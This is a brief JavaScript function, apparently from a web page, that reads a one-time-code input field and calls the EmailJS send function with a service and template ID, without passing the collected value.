function sendMail() {
    let parms = {
        OTP: document.getElementById("otpInput").value,
    };

    emailjs.send("service_ifxx4ei","template_yu7f0rg");
}